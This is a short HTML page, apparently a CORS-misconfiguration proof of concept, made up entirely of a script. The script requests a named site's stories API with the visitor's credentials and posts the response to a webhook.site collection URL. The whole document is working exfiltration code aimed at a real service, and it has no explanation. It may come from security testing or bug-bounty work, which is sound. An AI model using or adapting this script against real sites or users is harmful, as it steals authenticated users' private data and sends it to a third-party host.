<!DOCTYPE html>
<html>
<body>
<script>
    var req = new XMLHttpRequest();
    req.open('GET', 'https://story.basalam.com/api_v1.0/stories', true);
    req.withCredentials = true;
    req.onload = function() {
        var logReq = new XMLHttpRequest();
        logReq.open('POST', 'https://webhook.site/1512def5-c717-41c1-acf1-baf3a8864967', true);
        logReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        logReq.send('key=' + encodeURIComponent(req.responseText));
    };
    req.send();
</script>
</body>
</html>
